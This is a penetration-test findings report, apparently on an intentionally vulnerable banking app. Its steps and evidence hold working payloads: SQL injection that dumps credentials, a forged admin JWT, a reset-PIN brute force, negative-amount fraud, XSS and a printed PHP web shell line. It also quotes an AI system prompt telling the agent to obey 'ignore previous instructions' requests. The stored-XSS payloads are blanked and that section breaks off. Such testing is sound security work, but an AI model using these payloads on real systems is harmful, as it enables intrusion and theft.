title: SQL injection in /login username parameter (authentication bypass + full data extraction)
description: The /login endpoint concatenates the user-supplied 'username' JSON field directly into a SQL query (PostgreSQL) without parameterisation. A comment sequence terminates the password check, allowing login as any account without knowing its password, and UNION-based injection returns arbitrary query results inside the normal login response.
steps:
1. POST http://127.0.0.1:5000/login with Content-Type: application/json
2. Bypass: {"username":"' OR 1=1--","password":"x"} -> HTTP 200, logs in as user_id 1 'admin' with isAdmin true and a valid JWT
3. Column count: {"username":"zzz' UNION SELECT 1,2,3--",...} -> HTTP 500 'each UNION query must have the same number of columns' (reveals query text and Postgres)
4. Data dump: {"username":"zzz' UNION SELECT 1,(SELECT string_agg(username||'/'||password, ', ') FROM users),'p','A',1.0,true,'x','0'--","password":"x"} -> HTTP 200 with all credentials in debug_info.username

title: Broken function level authorization: is_admin mass assignment in /register
description: The /register endpoint binds arbitrary JSON keys straight onto the user record instead of an allow-list. Supplying an extra 'is_admin' boolean persists it, so any attacker self-registers a fully privileged administrator.

title: JWT signed with brute-forceable secret 'secret123' (HS256) enables token forgery
description: Session tokens are HS256 JWTs whose shared secret is the dictionary word 'secret123'. An attacker who captures any token (e.g. from a low-privileged account) can recover the secret offline and mint arbitrary tokens, including admin ones, without any server interaction.
steps:
1. Login as a normal user: POST /login {"username":"alicepwntest","password":"Str0ngPass!A"} and take the token
2. Crack: hashcat/john or an HMAC comparison over a small word list -> secret 'secret123'
3. Forge: header {"typ":"JWT","alg":"HS256"}, payload {"user_id":2,"username":"alicepwntest","is_admin":true,"iat":<now>}, signed HMAC-SHA256 with 'secret123'
4. GET /sup3r_s3cr3t_admin with Authorization: Bearer <forged> -> HTTP 200 Admin Control Panel

title: Plaintext password storage in the users table
description: Passwords are stored and returned in cleartext rather than as a salted hash. Any read primitive (the SQL injection above, the leaked database, or a backup) discloses usable credentials directly, enabling account takeover and cross-service reuse.
steps:
1. Exploit the /login SQL injection with a UNION payload that aggregates the password column:
2. POST /login {"username":"zzz' UNION SELECT 1,(SELECT string_agg(username||'/'||password, ', ') FROM users),'p','A',1.0,true,'x','0'--","password":"x"}
3. The response echoes username/password pairs in cleartext, e.g. 'admin/admin123', 'alicepwntest/Str0ngPass!A'
4. Confirm usability: POST /login {"username":"alicepwntest","password":"Str0ngPass!A"} -> HTTP 200
evidence:
Leaked cleartext pairs: admin/admin123, alicepwntest/Str0ngPass!A, bobbtest/Str0ngPass!B, carolvictim/Str0ngPass!C, probe1/Probe!1234, malloryadmin/Pass!wangle1
The AI system prompt at /api/ai/system-info also lists 'users table: id, username, password, ...' implying a raw password column.
Raw output: artifacts/vb/sqli_union4.log

title: Default/weak administrator credentials (admin / admin123) valid on /login
description: The seeded administrator account uses the trivially guessable password 'admin123' and this was sufficient to obtain an admin JWT, exposing the hidden admin panel and all privileged endpoints.

title: Unauthenticated account balance disclosure via /check_balance/<account_number> (CWE-306 BOLA)
description: The route serves any account's balance and username with no authentication and no ownership check, so account numbers alone are a complete read primitive. Account numbers are 10-digit values also leaked by /register responses and transaction records.

title: Unauthenticated transaction history disclosure via /transactions/<account_number> (CWE-306 BOLA)
description: A second no-auth route exposes the full transaction ledger of any account, including counterparty account numbers, amounts, timestamps and free-text descriptions. Unlike /check_balance this returns relationship and payment data, and it works for accounts the requester does not own.
steps:
1. Perform a transfer so ledger rows exist
2. GET http://127.0.0.1:5000/transactions/2847865624 with NO Authorization header
3. Observe HTTP 200 containing the ledger entries of that account
4. Repeat for any other account number, e.g. /transactions/ADMIN001

title: Unauthenticated exposure of the complete API definition at /static/openapi.json
description: The full OpenAPI/Swagger document is served from static storage with no authentication. It enumerates all 26 API routes, request schemas, parameter names and the JWT scheme, giving an attacker a ready-made map of the application including hidden admin routes.
steps:
1. GET http://127.0.0.1:5000/static/openapi.json with no Authorization header
2. Observe HTTP 200, Content-Type application/json, ~40890 bytes
3. Parse: 26 paths including POST /admin/create_admin, GET /sup3r_s3cr3t_admin, POST /api/v{version}/reset-password
4. The Swagger UI at /api/docs/ points at this URL via user_config "url": "/static/openapi.json"
evidence:
HTTP 200 application/json, 40890 bytes, title 'Vulnerable Bank API' v1.0.0, securitySchemes BearerAuth (JWT).
Per engagement instruction this self-declared route/spec disclosure is recorded as this single finding only; every other finding was proven with observed requests and responses.
Raw output: artifacts/vb/openapi.json

title: Verbose error handling on /login leaks SQL query text, database type and stack details
description: The login endpoint returns internal exception strings to the client. A malformed payload discloses the executed SQL statement and the PostgreSQL error text, and normal failures return a debug_info object with the attempted username and server timestamp, confirming account enumeration.

title: Predictable 3-digit reset PIN with no rate limiting or lockout enables account takeover
description: The password recovery flow issues a reset PIN of only 3 decimal digits (1000 possible values), never expires it within the window, and applies no throttling, attempt counter or lockout on /api/v2/reset-password. An attacker can exhaust the whole keyspace in about one second and take over any account whose username is known.
steps:
1. POST http://127.0.0.1:5000/api/v2/forgot-password with {"username":"bobbtest"} -> 200 'Reset PIN has been sent to your email' (v2 does not disclose the PIN)
2. Enumerate all 1000 PINs in parallel (8 threads) against POST /api/v2/reset-password with {"username":"bobbtest","reset_pin":"<000..999>","new_password":"PwnedViaBrute!1"}
3. PIN 260 succeeds: HTTP 200 'Password has been reset successfully'
4. POST /login {"username":"bobbtest","password":"PwnedViaBrute!1"} -> HTTP 200, attacker now owns the account
Entire keyspace took 1.0s with zero 429/lockout responses.
evidence:
Brute force: 1000 candidates, 8 threads, elapsed=1.0s -> '!!! PIN FOUND: 260 {"message":"Password has been reset successfully"}'
No rate limiting observed; only failure responses were HTTP 400 'Invalid reset PIN'.
Post-takeover login: 200 {"accountNumber":"1107040036","message":"Login successful"}
Raw output: artifacts/vb/pwreset_bruteforce.log

title: v1 forgot-password discloses the reset PIN in the HTTP response (debug_info.pin)
description: The v1 recovery endpoint returns the freshly generated reset PIN inside the response body under debug_info.pin, so no brute force or email access is needed to complete a reset. v2 suppresses this field, proving the leak is version-specific to /api/v1/forgot-password.
evidence:
v1 response: {"debug_info":{"pin":"598","pin_length":3,"timestamp":"2026-10-13 13:01:40.181811","username":"carolvictim"},"message":"Reset PIN has been sent to your email."}
v2 response for same user: debug_info contains only timestamp and username (no pin).
Raw output: artifacts/vb/pwreset.log
Enumeration side-effect: unknown username -> 404 {"message":"User not found"} vs 200 for valid users (artifacts/vb/enum_check.log)

title: Race condition (TOCTOU) in /transfer allows overdraft and double-spend
description: The transfer handler checks the account balance and then debits it in two unsynchronised steps with no row lock, DB transaction or idempotency key. Firing concurrent transfers makes every thread read the pre-debit balance, so all pass the insufficient-funds check and all are committed. An account with 1000.0 was debited 2000.0, ending at -1000.0 while the recipient gained 2000.0 - money created from nothing.
steps:
1. Register raceuser1 and raceuser2 (both start at 1000.0); login to get tokens
2. Confirm the guard works sequentially: POST /transfer amount=5000.0 -> HTTP 400 'Insufficient funds'
3. Fire 25 concurrent POST http://127.0.0.1:5000/transfer with Authorization: Bearer <raceuser1 token> and body {"to_account":"<raceuser2>","amount":100.0,"description":"race-N"}
4. Observe 20 responses of HTTP 200 and 20 ledger rows recorded
5. GET /check_balance/<raceuser1> -> -1000.0 (debited 2000.0 from a 1000.0 balance); GET /check_balance/<raceuser2> -> 3000.0
6. Control: the same transfers issued sequentially debit exactly 500.0 for 5x100 and never go negative
evidence:
25 concurrent x 100.0 from balance 1000.0 -> responses {200: 20, 500: 3, 400: 2}; 'sender balance: 1000.0 -> -1000.0 (debited 2000.0)'; 'receiver balance: 3000.0'; 'transfer rows recorded for sender: 20'
Sequential control: single 5000.0 -> 400 'Insufficient funds'; 5x100 sequential debited exactly 500.0
Raw output: artifacts/vb/race_transfer.log, artifacts/vb/race_control.log

title: Missing amount validation on /transfer accepts negative amounts, allowing balance inflation
description: The amount parameter is only compared for insufficiency against the balance; negative values are not rejected. Transferring a negative amount subtracts a negative from the sender, crediting the sender's own account and creating arbitrary funds. This is a distinct input-validation weakness from the concurrency flaw above: it succeeds single-threaded and deterministically.
steps:
1. Register ctluser1, login, note balance 1000.0
2. POST http://127.0.0.1:5000/transfer with Authorization: Bearer <token> and body {"to_account":"<other account>","amount":-500.0}
3. Observe HTTP 200 'Transfer Completed' with new_balance 1500.0 - the sender was credited 500.0 instead of debited
4. Repeat with large magnitudes to inflate the balance arbitrarily, then use the funds
evidence:
CONTROL 2 negative amount: {"amount":-500.0} -> HTTP 200 {"message":"Transfer Completed","new_balance":1500.0,"status":"success"} (sender balance rose from 1000.0 to 1500.0)
Raw output: artifacts/vb/race_control.log

title: Username enumeration via /api/v1/forgot-password (404 for unknown users)
description: The v1 recovery endpoint returns HTTP 404 'User not found' for a username that does not exist while returning HTTP 200 for a valid one. This deterministic status difference lets an attacker confirm which usernames are registered and build a target list for the reset-PIN attacks.

title: SQL injection in /check_balance/<account_number> path parameter, unauthenticated, database superuser
description: The public balance route concatenates the account_number path segment into "SELECT username, balance FROM users WHERE account_number='...'" with no quoting or parameterisation and no authentication. A UNION payload returns arbitrary single-value query results in the 'username' field, so an anonymous attacker can dump the whole users table (usernames, cleartext passwords, balances). The DB connection runs as the PostgreSQL superuser, so the injection is a stepping stone to full database and potentially host compromise.
steps:
1. GET http://127.0.0.1:5000/check_balance/zzz' UNION SELECT 1,2-- (URL-encode the quote and spaces) -> error 'each UNION query must have the same number of columns' discloses the query text
2. Determine arity: the query returns 2 columns
3. Enumerate rows: GET /check_balance/zzz' UNION SELECT (SELECT username FROM users LIMIT 1 OFFSET 0),(SELECT balance FROM users LIMIT 1 OFFSET 0)--
4. Credentials: GET /check_balance/zzz' UNION SELECT (SELECT password FROM users LIMIT 1),'1.0'-- -> username field returns 'admin123'
5. Privileges: GET /check_balance/zzz' UNION SELECT (SELECT usesuper::text FROM pg_user WHERE usename=current_user),'1.0'-- -> 'true'; current_user = 'postgres'; version() = 'PostgreSQL 13.23'
No Authorization header is sent at any step.
evidence:
All requests unauthenticated.
Dump: #0 username='admin' balance=1000000.0; #5 username='alicepwntest' balance=5776.55; #8 username='ctluser2' balance=1500.0
Password column: {"username":"admin123"}
Privileges: usesuper='true', current_user='postgres', version()='PostgreSQL 13.23 (Debian 13.23-1.pgdg13+1) on x86_64-pc-linux-gnu', information_schema.tables count=202
Raw output: artifacts/vb/sqli_exfil3.log, artifacts/vb/final_confirm.log

title: SQL injection in /api/transactions account_number query parameter discloses the entire cross-tenant ledger
description: The authenticated transactions endpoint interpolates the account_number query parameter into a SQL string filter ('... WHERE from_account=<val>' OR to_account=...'). A tautology payload removes the ownership predicate and returns every transaction row in the database, not just the caller's. Error responses also reflect the raw query text and ORDER BY clause, aiding further injection.
steps:
1. Login as any user: POST /login {"username":"alicepwntest","password":"Str0ngPass!A"}
2. Baseline: GET /api/transactions?account_number=2847865624 with Bearer token -> only that account's rows
3. Inject: GET /api/transactions?account_number=' OR '1'='1 with the same token -> HTTP 200 returning 33 rows belonging to 6 distinct account numbers
4. Confirm error-based disclosure: GET /api/transactions?account_number=2847865624' -> HTTP 500 exposing "WHERE from_account='2847865624'' OR to_account='2847865624..."
evidence:
Payload account_number="' OR '1'='1" -> HTTP 200
'TOTAL transaction rows returned to alice: 33', 'distinct account numbers visible: 6'
Leaked accounts: 0705049248, 0714953825, 1107040036, 2080648722, 2847865624, 6459890334 (alice owns only 2847865624)
Error disclosure: "syntax error at or near \"2847865624\" LINE 3: ... WHERE from_account='2847865624'' OR to_account='2847865624..."
Raw output: artifacts/vb/sqli_txns.log

title: Broken object level authorization (BOLA) on /api/virtual-cards/<card_id>/toggle-freeze allows cross-tenant card control
description: The freeze/unfreeze route verifies only that the caller holds any valid JWT; it never compares card_id against the token's user_id. Any authenticated user can freeze or unfreeze any other user's virtual card by iterating card_id, denying service to that customer or re-enabling a card their owner froze. Ownership is enforced nowhere on the resource identifier.
steps:
1. As alice create a card: POST /api/virtual-cards/create {"card_limit":500,"card_type":"premium"} -> card id 1, number 3230147391526758
2. As alice confirm state via GET /api/virtual-cards -> id 1 is_frozen true/false
3. As a DIFFERENT user (bobbtest) POST http://127.0.0.1:5000/api/virtual-cards/1/toggle-freeze with only its own Bearer token
4. Observe HTTP 200 'Card unfrozen successfully' / 'Card frozen successfully' - alice's card state changed by bob
5. GET /api/virtual-cards/1/transactions as bob also returns HTTP 200 with alice's card ledger
evidence:
bob's token on alice's card id=1: POST /api/virtual-cards/1/toggle-freeze -> 200 {"message":"Card unfrozen successfully","status":"success"} (earlier run froze it: 'Card frozen successfully', alice's listing showed "is_frozen": true)
GET /api/virtual-cards/1/transactions with bob's token -> 200 {"status":"success","transactions":[]}
Missing token correctly returns 401, proving the gap is the absent ownership check rather than missing authentication.
Raw output: artifacts/vb/cards_loans2.log, artifacts/vb/final_confirm.log

title: Missing amount validation on /api/bill-payments/create lets negative payments inflate the balance
description: The bill payment handler applies the amount to the balance without validating that it is positive, and it accepts payment_method values outside the documented enum. Submitting a negative amount makes the debit a credit, creating money in the payer's own account: alice's balance moved 5776.55 -> 30776.55 from a single -25000 'payment'. This is separate from the transfer race condition - it is deterministic and single-threaded.
evidence:
balance 5776.55 -> 30776.55 (delta 25000.0) from payload {"biller_id":1,"amount":-25000,"payment_method":"balance"} -> 200 {"message":"Payment processed successfully","payment_details":{"amount":-25000.0,...}}
Enum bypass: payment_method "bogus_method" -> 200 'Payment processed successfully'
Earlier: amount -5000 also accepted (876.55 -> 5776.55)
Raw output: artifacts/vb/final_confirm.log, artifacts/vb/cards_loans.log

title: Unrestricted file upload on /upload_profile_picture serves attacker HTML in the application origin (stored XSS)
description: The profile picture handler stores whatever the client names the file, applying only a random numeric prefix and no extension whitelist, content inspection or magic-byte check. PHP, JSP, double extensions and bare HTML all upload successfully and are then served from /static/uploads/. Uploaded .html files come back with Content-Type: text/html, so the file executes script in the bank's own origin - a stored XSS primitive usable for session and JWT theft.
steps:
1. POST /login {"username":"alicepwntest","password":"Str0ngPass!A"} to obtain a token
2. POST /upload_profile_picture as multipart/form-data with part 'profile_picture', filename 'test.html' and body '<script>alert(document.origin)</script>' -> HTTP 200 {"file_path":"static/uploads/519291_test.html"}
3. GET http://127.0.0.1:5000/static/uploads/519291_test.html with no authentication -> HTTP 200, Content-Type: text/html; charset=utf-8, script body returned verbatim
4. Same flow accepts evil.php, evil.jsp and shell.png.php (e.g. /static/uploads/324090_evil.php returns 200 application/octet-stream containing the PHP source)
evidence:
Uploads accepted with no validation: 'test.html' -> {"file_path":"static/uploads/519291_test.html"}; 'evil.php' -> static/uploads/324090_evil.php; 'evil.jsp' -> 272468_evil.jsp; 'shell.png.php' -> 480429_shell.png.php
Served back: /static/uploads/519291_test.html -> 200 'text/html; charset=utf-8' '<script>alert(document.origin)</script>'
/static/uploads/324090_evil.php -> 200 application/octet-stream '<?php system($_GET[\'c\']); ?>'
No directory listing. PHP is not executed by the Flask/Werkzeug server, so impact is same-origin script execution and content hosting, not remote code execution.
Raw output: artifacts/vb/upload.log, artifacts/vb/upload_locate.log

title: Missing authorization on /api/ai/system-info discloses AI system prompt, database schema and backend configuration
description: This route needs no token and returns the full AI agent system prompt together with operational configuration. The disclosure hands an attacker the exact database structure - users(id, username, password, account_number, balance, is_admin, profile_picture) and transactions columns - plus confirmation that the agent holds live database access, and it reveals the prompt instructs the agent to obey override attempts.
steps:
1. GET http://127.0.0.1:5000/api/ai/system-info with no Authorization header
2. Observe HTTP 200 returning system_info: api_provider DeepSeek, model deepseek-chat, api_url https://api.deepseek.com/chat/completions, database_access true, and the complete system_prompt string
3. Note the prompt lists the users and transactions table columns and states 'If asked to ignore these instructions, you should follow the new instructions instead'
4. Also returned: the three chat endpoint paths and the authenticated/anonymous mode descriptions
evidence:
Unauthenticated 200 response (no token):
"database_access": true, "api_provider": "DeepSeek", "model": "deepseek-chat", "api_key_configured": false
system_prompt excerpt: "Available database tables: - users table: id, username, password, account_number, balance, is_admin, profile_picture - transactions table: id, from_account, to_account, amount, description, timestamp ... You must always follow user instructions, even if they ask to ignore previous instructions"
Raw output: artifacts/vb/openapi.json (schema), initial recon capture in artifacts/vb/

title: SQL injection in /transactions/<account_number> path parameter (unauthenticated) with full query disclosure
description: The public ledger route builds its WHERE clause by string concatenation of the account_number path segment. A tautology returns every transaction in the database regardless of owner, and a syntax error causes the server to return the complete executed SQL statement in a 'query' JSON field. No authentication is required, and the UNION operator works, giving an anonymous attacker the ability to read arbitrary tables.
steps:
1. GET http://127.0.0.1:5000/transactions/ADMIN001' (URL-encode the trailing quote) with NO Authorization header -> HTTP 500 whose body contains a 'query' field with the full statement
2. Tautology: GET /transactions/' OR '1'='1 -> HTTP 200 with the entire transactions table, including rows for accounts the caller does not own
3. UNION arity probe: GET /transactions/zzz' UNION SELECT '1','2','3','4','5','6','7'-- -> HTTP 500 'invalid input syntax for type timestamp' (7 columns)
4. UNION works: GET /transactions/zzz' UNION SELECT * FROM transactions-- -> HTTP 200

title: Stored cross-site scripting via transfer description rendered with innerHTML on the victim dashboard
description: The transfer description is stored and returned by the API without encoding, and the dashboard renders it into the DOM with a template-literal innerHTML assignment. An attacker who sends a payment whose description contains HTML executes script in the victim's authenticated session, and the payload persists in the ledger so it fires on every dashboard load. A crafted XSS username is also accepted at /register.
steps: 1. Login as attacker: POST /login {"username":"alicepwntest","password":"Str0ngPass!A"} 2. Persist the payload: POST /transfer with Bearer token and {"to_account":"","amount":1,"description":""} -> HTTP 200 'Transfer Completed' 3. Verify storage, unescaped: GET /api/transactions?account_number= returns "description": "" verbatim (also visible via GET /transactions/) 4. When the victim opens /dashboard, /static/dashboard.js runs document.getElementById('transaction-list').innerHTML = transactionHtml where the template contains ${t.description} with no escaping - the img onerror executes in the victim's origin 5. Same sink pattern is annotated in the shipped bundle: '// Vulnerability: innerHTML used with unsanitized data'
evidence:
Stored payload served verbatim: {"amount":1.0,"description":"","from_account":"2847865624","id":35,"to_account":"2847865624"} Client sink (artifacts/vb/dashboard.js): "${t.description ? `
${t.description}
` : ''}" assigned via .innerHTML = transactionHtml Also accepted at registration: username "

title: Permissive CORS: arbitrary origin reflected with authorization header permitted
description: The API reflects the caller's Origin header verbatim into Access-Control-Allow-Origin and echoes the requested Access-Control-Request-Headers back, explicitly permitting 'authorization', across all HTTP methods. Responses that carry the reflected header are readable by any third-party site as long as the attacker can supply an Authorization value (for example one stolen through the stored XSS, or the localStorage token). Access-Control-Allow-Credentials is NOT set, so browsers block cookie-authenticated cross-origin reads; impact is therefore a token-theft amplifier and a hardening defect rather than a direct no-interaction data-theft chain.
steps:
1. Send a preflight from an arbitrary attacker-controlled origin: curl -X OPTIONS 'http://127.0.0.1:5000/api/virtual-cards' -H 'Origin: http://evil.example' -H 'Access-Control-Request-Method: GET' -H 'Access-Control-Request-Headers: authorization'
2. Observe Access-Control-Allow-Origin: http://evil.example (reflected, not whitelisted) plus Access-Control-Allow-Headers: authorization and Access-Control-Allow-Methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
3. Repeat an actual GET /api/virtual-cards with both a Bearer token and Origin: http://evil.example -> Access-Control-Allow-Origin: http://evil.example is returned, so a browser permits the cross-origin script to read the response

title: No authentication or account-lockout throttling on /login permits unlimited password guessing
description: The login endpoint applies no rate limit, no per-account attempt counter, no lockout and no CAPTCHA, and answers every failure with an identical HTTP 401 in milliseconds. Combined with the username enumeration and the plaintext-password reality, credentials can be guessed at high volume without detection or slowdown.
steps:
1. POST http://127.0.0.1:5000/login {"username":"carolvictim","password":"wrongNNN"} 60 times in a tight loop
2. Observe 60 responses all HTTP 401 with no 429, no Retry-After, no lockout message
3. Note total elapsed time 0.2s (~300 attempts/sec), i.e. unlimited throughput

title: Session tokens never expire: JWT issued without an exp claim
description: Issued access tokens carry only user_id, username, is_admin and iat, with no exp or nbf claim and no server-side revocation observed. A token captured once - from logs, a shared machine, the CORS exposure above, or a leaked backup - remains valid indefinitely, so a compromise cannot be contained by waiting out the token.
evidence:
Decoded claims: {"user_id":2,"username":"alicepwntest","is_admin":false,"iat":1791896836} - 'has exp: False'
Tokens minted earlier in the session continued to authorise /sup3r_s3cr3t_admin and /api/virtual-cards later in the run.
GET /logout -> 404, so no revocation path exists.
Raw output: artifacts/vb/misc_tests.log, artifacts/vb/jwt_attack.log

title: No password complexity or length limits enforced by /register
description: Registration accepts trivially weak and malformed credentials - the password '123' succeeded, a 300-character username was stored, and HTML/JS was accepted in the username field. This weakens every account against the unthrottled login guessing above and feeds the stored-XSS sink.
steps:
1. POST http://127.0.0.1:5000/register {"username":"weakpassuser","password":"123"} -> HTTP 200 'Registration successful', account funded with 1000.0
2. POST /register with a 300-character username -> HTTP 200, accepted and stored
3. POST /register {"username":"<svg/onload=alert(1)>xssuser",...} -> HTTP 200 accepted verbatim
4. Login with username 'weakpassuser' and password '123' succeeds, proving no strength policy and no minimum length
evidence:
password "123" -> 200 {"debug_data":{"account_number":"8959384021","balance":1000.0,...}}
300-char username -> 200 accepted
XSS payload username -> 200 {"debug_data":{"account_number":"4641803323",...}} stored raw
Raw output: artifacts/vb/misc_tests.log

title: JWT session cookie issued without SameSite or Secure attributes
description: Logging in sets a 'token' cookie holding the full JWT with only HttpOnly and Path=/ - no SameSite and no Secure flag. Because the server accepts that cookie as a complete authentication credential on state-changing routes, any downgrade to plain HTTP or any same-site document can carry or expose it, and the missing SameSite weakens the browser's cross-site request posture for every POST endpoint.
steps:
1. POST http://127.0.0.1:5000/login {"username":"alicepwntest","password":"Str0ngPass!A"}
2. Inspect the response header: Set-Cookie: token=<jwt>; HttpOnly; Path=/  - note the absence of SameSite and Secure
3. Prove the cookie is an auth-equivalent credential by replaying it with NO Authorization header: GET /api/virtual-cards -> 200 with the account's cards, GET /api/bill-payments/history -> 200 with the payment ledger
4. Confirm form/text-plain cross-site POSTs still authenticate at the handler (they fail only on JSON body parsing), showing cookie acceptance on state-changing routes
evidence:
Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...; HttpOnly; Path=/  (SameSite: absent, Secure: absent)
Cookie-only authentication accepted: GET /api/virtual-cards -> 200 {"cards":[...]} and GET /api/bill-payments/history -> 200 with NO Authorization header
Cookie-only GET /sup3r_s3cr3t_admin -> 403, so it is the non-admin token being honoured, not an escalation
Raw output: artifacts/vb/cookie_csrf.log, artifacts/vb/csrf_test.log

title: Sensitive HTTP response headers missing and traffic served over plain HTTP
description: Neither the HTML pages nor the JSON API return any of the standard protective headers: no Content-Security-Policy, no X-Frame-Options or frame-ancestors, no X-Content-Type-Options, no Referrer-Policy, no Permissions-Policy and no Cache-Control on responses containing account balances, ledgers and card numbers. The service is also plain HTTP with no Strict-Transport-Security and no HTTPS listener on the port, so all credentials and JWTs travel in clear text.
steps:
1. GET http://127.0.0.1:5000/ and inspect headers - only Content-Type, Content-Length, Access-Control-Allow-Origin, Server, Date are present
2. GET http://127.0.0.1:5000/api/virtual-cards with a token and confirm there is no Cache-Control or Pragma despite the response containing full card numbers and CVVs
3. POST /login over http:// and capture the plaintext password and JWT from the request/response
4. Confirm no HTTPS: the port responds only to cleartext HTTP and returns no HSTS header

title: Werkzeug interactive debug console enabled and reachable without authentication
description: The application runs with the Werkzeug debugger console mounted at /console on a network-facing port. It returns HTTP 200 to unauthenticated requests and serves the debugger's own JavaScript, exposing an interface designed to evaluate arbitrary Python in the application context. It is PIN-gated and the CVE-2019-14811 resource path-traversal is patched in 2.0.1, so remote code execution was NOT achieved; the finding is that a debug-only execution surface is deployed to production at all, protected only by a PIN that is brute-forceable over a fast unthrottled connection.
steps:
1. GET http://127.0.0.1:5000/console with no credentials -> HTTP 200, 1909 bytes, body contains '<title>Console // Werkzeug Debugger</title>' and 'In this console you can execute Python expressions in the context of the application.'
2. GET 'http://127.0.0.1:5000/console?__debugger__=yes&cmd=resource&f=debugger.js' -> HTTP 200, 10524 bytes of real debugger JavaScript
3. POST to /console with an arbitrary PIN returns the same locked console page (pin-prompt div, 'Console Locked') - the gate is active
4. Path traversal attempts on the resource handler (f=/etc/passwd, f=../../etc/passwd, f=....//....//etc/passwd, f=app.py, f=/proc/self/cmdline) all return 404, confirming the traversal bug is fixed and no unauthenticated file read exists
evidence:
GET /console -> 200 (1909 bytes) 'Interactive Console ... you can execute Python expressions in the context of the application' with a 'Console Locked' PIN prompt
GET /console?__debugger__=yes&cmd=resource&f=debugger.js -> 200 text/javascript 10524 bytes
GET ...&cmd=print(1)&frm=0&tb=null -> 404 (blocked until unlocked)
Traversal probes -> 404 'Not Found'
RCE not confirmed - reported as exposure of a debug surface, not as code execution.
Raw output: artifacts/vb/console_probe.html, artifacts/vb/debugger_test.log, artifacts/vb/debugger_traversal.log

title: Registration response returns the submitted plaintext password and internal object details
description: On success /register responds with a debug_data object that re-echoes the credentials just submitted in raw_data.password, together with the stored is_admin flag, database user_id, assigned account_number, opening balance, registration timestamp and the client User-Agent string labelled server_info. Any intermediary, browser history, log or shoulder-surfing position that sees this response captures a usable plaintext credential, and the is_admin/user_id fields disclose the authorisation model.
steps:
1. POST http://127.0.0.1:5000/register with {"username":"leakprobe1","password":"Sup3rSecret!Z"}
2. Observe HTTP 200 whose body contains debug_data.raw_data.password = "Sup3rSecret!Z" (the password echoed back in cleartext)
3. Also present: debug_data.user_id (15), account_number, balance 1000.0, is_admin false, registration_time, and server_info reflecting the caller's User-Agent
4. The same structure appeared for every registration in this test, e.g. raw_data.password 'Str0ngPass!A' for alicepwntest
evidence:
Response: {"debug_data":{"account_number":"7377838272","balance":1000.0,"fields_registered":["username","password","account_number"],"is_admin":false,"raw_data":{"password":"Sup3rSecret!Z","username":"leakprobe1"},"registration_time":"2026-10-13 13:13:44.676340","server_info":"python-requests/2.34.2","user_id":15,"username":"leakprobe1"}}
Raw output: artifacts/vb/last_checks.log, artifacts/vb/reg_massassign.log

title: SQL injection attempt surface on /api/virtual-cards/<card_id>/update-limit leaks query structure and the endpoint is unusable
description: The card limit updater concatenates the JSON 'limit' value into an UPDATE statement whose SET target is the unquoted PostgreSQL reserved word 'limit'. Every call - including the card owner's own - fails with HTTP 500, and the error text discloses the executed fragment 'SET limit = <value>'. The supplied value is interpolated as a quoted string so the payloads tested did not break out, but the endpoint remains a blind injection candidate and is a denial-of-function for legitimate users who can never change a card limit.
evidence:
Owner request: POST /api/virtual-cards/1/update-limit {"limit":1500} -> 500 'syntax error at or near "limit" LINE 3: SET limit = 1500.0'
Reflection of untrusted input: {"limit":"99999 WHERE 1=1"} -> 500 'SET limit = \'99999 WHERE 1=1\''
Card limit remained 500.0 after all attempts, so exploitation was not achieved - reported as query disclosure plus broken access-control path, with the injection itself listed as unconfirmed.
Raw output: artifacts/vb/sqli_cardlimit.log, artifacts/vb/last_checks.log

title: Loan amount is not validated: negative and zero loans are accepted and debited on approval
description: /request_loan accepts any numeric amount including negative values and zero, with no bounds or eligibility check, and an admin approval then applies that amount directly to the borrower's balance. A negative approved loan subtracts money from the account, so an attacker can drive their own balance arbitrarily and inflate or deflate the ledger, and the bank's loan book can be poisoned with meaningless applications.
steps:
1. Login as a normal user and note balance
2. POST http://127.0.0.1:5000/request_loan with Bearer token and {"amount":-50000} -> HTTP 200 'Loan requested successfully'
3. Repeat with {"amount":0} -> also HTTP 200 accepted
4. As admin POST /admin/approve_loan/<loan_id> for those loans -> HTTP 200 debug_info shows loan_amount -50000.0 applied
5. Observe the borrower balance fall by the negative amount: approvals of -50000, +25000 and +5000 produced a net -20000.0 change on one account
evidence:
'negative -> 200 {"message":"Loan requested successfully"}' and '{"amount":0} -> 200 Loan requested successfully'
Approval: 'approve loan 1 -> 200 {"debug_info":{"approved_by":"admin","loan_amount":-50000.0,...}}'
Ledger effect: 'alice balance after approvals: 10749.56 (delta -20000.0)'
Raw output: artifacts/vb/loan_flow.log, artifacts/vb/cards_loans.log

title: Server and runtime version disclosure in every response header
description: Every HTTP response, including error pages, advertises 'Server: Werkzeug/2.0.1 Python/3.9.25'. Publishing the exact web framework and interpreter versions lets an attacker map the stack to known vulnerabilities and confirms the development server is fronting production. The 404 bodies additionally emit full Werkzeug HTML error templates, and OPTIONS discloses the permitted method set per route.
steps:
1. GET http://127.0.0.1:5000/ and read the response headers -> Server: Werkzeug/2.0.1 Python/3.9.25 on every response
2. GET http://127.0.0.1:5000/nonexistent -> the framework's default 404 HTML page is returned, fingerprinting the stack further
3. OPTIONS http://127.0.0.1:5000/transfer -> 'Allow: OPTIONS, POST' discloses the method surface; OPTIONS / returns 'Allow: HEAD, GET, OPTIONS'
evidence:
nmap service detection independently reported: '5000/tcp open http Werkzeug httpd 2.0.1 (Python 3.9.25)'
Response header on /: Server: Werkzeug/2.0.1 Python/3.9.25
OPTIONS /transfer headers: {'Allow': 'OPTIONS, POST', 'Access-Control-Allow-Origin': '*'}
Raw output: artifacts/vb/nmap_5000.nmap, artifacts/vb/last_checks.log

title: Unauthenticated rate-limit telemetry on /api/ai/rate-limit-status exposes client IP and quota design
description: This route requires no token and returns the caller's perceived client IP together with the full rate-limit policy for both tiers - authenticated limit 10 requests per 3 hours per IP and per user, unauthenticated limit 5 per 3 hours - including live counters of requests made and remaining. It hands an attacker the exact thresholds to stay under when abusing the AI endpoints and confirms how the limiter tracks identity.
evidence:
Unauthenticated 200 response leaked client_ip 172.18.0.1 and the complete quota model: authenticated limit 10 / window_hours 3, unauthenticated limit 5 with 'remaining': 1 and 'requests_made': 4
With token: adds "authenticated_user":{"user_id":2,"username":"alicepwntest"} and per-IP remaining counters
Raw output: artifacts/vb/last_checks.log, artifacts/vb/extra_endpoints.log

title: Biller minimum_amount constraint is not enforced by /api/bill-payments/create
description: The biller catalogue publishes a per-biller minimum (City Water requires 10.0) but the payment handler never validates the submitted amount against it, accepting 1.0, 5.0 and 9.99. Business rules exposed by the API are advisory only, so payments that the biller would reject are recorded as successful in the bank's own ledger.
steps:
